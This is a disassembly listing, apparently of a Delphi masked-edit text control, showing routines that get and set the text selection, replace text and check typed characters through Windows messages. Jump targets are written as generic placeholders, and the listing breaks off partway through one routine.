cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_4580d8
mov [ ebx ] 0x0
sub_4577d4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436540
mov eax ebx
call sub_457bd4
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_457dac
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_458064
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_457854
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4578b0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4578bc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404284
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578b7
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax esi
call sub_404338
mov edx eax
mov eax ebx
call sub_434b90
mov eax ebx
call sub_458064
sub_4578d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_457910
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_457920
mov eax [ ebp - 0x4 ]
call sub_404138
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457917
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_457920
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4579a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_457bd4
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4578bc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_4589e4
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_434bb4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4579ab
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_45899c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ecc
sub_4579b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457aaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_457bd4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_403f10
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_434be4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45899c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403f10
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_4571a8
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_403f10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457ab1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_457854
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
sub_457ab8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457bd4
test al al
jne r-xdata
mov eax ebx
call sub_42e138
mov dx 0x2e
mov eax ebx
call sub_458618
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_457aec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457bc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_457bd4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457bcd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
call sub_429604
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_429604
lea edx [ ebp - 0x4 ]
call sub_42924c
call sub_429604
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_457dac
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4578bc
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_4590d0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_457854
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_459168
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_457854
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_457df4
sub_457be4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457c99
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4578bc
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4589e4
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_403ecc
mov eax esi
call sub_404138
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_456f38
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_456dbc
mov [ ebx + 0x22c ] al
mov eax esi
call sub_456e40
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45899c
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_403f10
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_457854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457ca0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403e9c
retn
sub_457ca8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_404284
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_457be4
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_457dac
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_42df68
mov eax ebx
call sub_457bd4
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_457854
mov eax ebx
call sub_43b694
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_43b390
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_42df68
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_457df4
sub_457d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457bd4
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_42df68
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_42df68
pop esi
pop ebx
retn
sub_457dac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_457dd0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_457df4
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458054
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_457bd4
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_4578bc
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40bcb8
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_4578bc
mov eax [ ebp - 0x218 ]
call sub_404138
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_4578bc
mov eax [ ebp - 0x210 ]
call sub_404138
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_457dd0
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_4578bc
mov eax [ ebp - 0x21c ]
call sub_404138
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_4578bc
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_457dd0
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45805b
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_403e9c
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_457fc2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_458064
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_457bd4
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_457dac
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_457df4
sub_4580b0
push ebx
mov ebx eax
mov eax ebx
call sub_42df98
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_457854
xor edx edx
mov eax ebx
call sub_42dfd0
sub_4580d8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45829d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4582a4
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_457dac
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_458618
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4584ec
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_457df4
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_458bb8
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_43b390
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_404060
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402a20
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_4029f0
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_4040dc
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_457dd0
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_404338
push eax
push 0x0
push 0xc2
mov eax esi
call sub_43b390
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_457dac
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_458498
sub_4582b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45848a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458491
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403e9c
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_457dac
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4584d0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4578bc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_457dd0
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4578bc
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_457df4
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_457df4
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_457dd0
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_458498
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_458498
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_458498
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4584d0
jmp r-xdata
sub_458498
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_4584ec
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_456fe8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_457df4
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_4584ec
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_456fe8
test al al
jne r-xdata
inc ebx
sub_458514
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_456fe8
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4584ec
mov ebx eax
dec ebx
sub_458548
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_457dac
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_457df4
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_457df4
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_457dd0
mov eax ebx
call sub_458064
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_457dd0
mov eax ebx
call sub_458064
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_458618
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_458724
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45872b
lea eax [ ebp - 0xc ]
call sub_403e78
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_457dac
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4578bc
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_4590d0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_404398
mov eax [ ebp - 0xc ]
call sub_404338
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_43b390
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_4584d0
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_457dac
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_457dac
mov edx [ edi ]
dec edx
mov eax ebx
call sub_457df4
mov edx [ edi ]
mov eax ebx
call sub_4584ec
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_457df4
jmp r-xdata
sub_458734
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4587b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_457bd4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_42e690
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_458064
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4578bc
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_403ecc
mov edx esi
mov eax ebx
call sub_42e690
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4587be
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_4587c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_458845
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42e6cc
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4578bc
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_403ecc
mov eax ebx
call sub_43b694
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45884c
lea eax [ ebp - 0xc ]
call sub_403e78
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_457dac
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4584ec
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_457df4
sub_458854
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_457bd4
test al al
je r-xdata
mov eax ebx
call sub_42df98
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_45888c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457bd4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43a7b8
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_458064
sub_4588c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_458952
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4578bc
mov eax esi
call sub_457bd4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458959
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax esi
call sub_42df98
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_457df4
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_458960
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
pop ecx
pop edx
pop ebx
retn
sub_45899c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_456ba0
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_456ba0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4589e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458baa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_403ecc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_404138
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_456b04
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_404138
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
